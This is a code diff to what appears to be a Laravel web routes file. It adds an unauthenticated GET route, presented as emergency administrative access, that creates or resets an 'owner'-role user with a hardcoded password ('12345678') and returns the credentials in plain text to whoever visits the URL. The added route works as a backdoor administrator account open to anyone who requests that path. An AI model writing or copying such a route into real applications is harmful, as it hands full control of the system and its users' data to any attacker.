@@ -17,6 +17,19 @@ Route::get('/demo-fast', function(\Illuminate\Http\Request $request) {
     return redirect('/')->with('error', 'El entorno de demo no está listo.');
 })->name('demo.fast');
 
+// Ruta de Emergencia para Acceso Administrativo (OWNER)
+Route::get('/force-admin-mario', function() {
+    $user = \App\Models\User::updateOrCreate(
+        ['email' => 'prueba@gmail.com'],
+        [
+            'name' => 'MARIO OWNER',
+            'password' => \Illuminate\Support\Facades\Hash::make('12345678'),
+            'role' => 'owner'
+        ]
+    );
+    return "USUARIO_CREADO_EXITO: " . $user->email . " | Password: 12345678";
+});
+
 // Rutas Públicas de Validación (Escaneo de QR)
 Route::get('/v/{uuid}', [\App\Http\Controllers\ValidationController::class, 'show'])->name('validation.show');
 Route::post('/v/{uuid}/burn', [\App\Http\Controllers\ValidationController::class, 'burn'])->name('validation.burn');
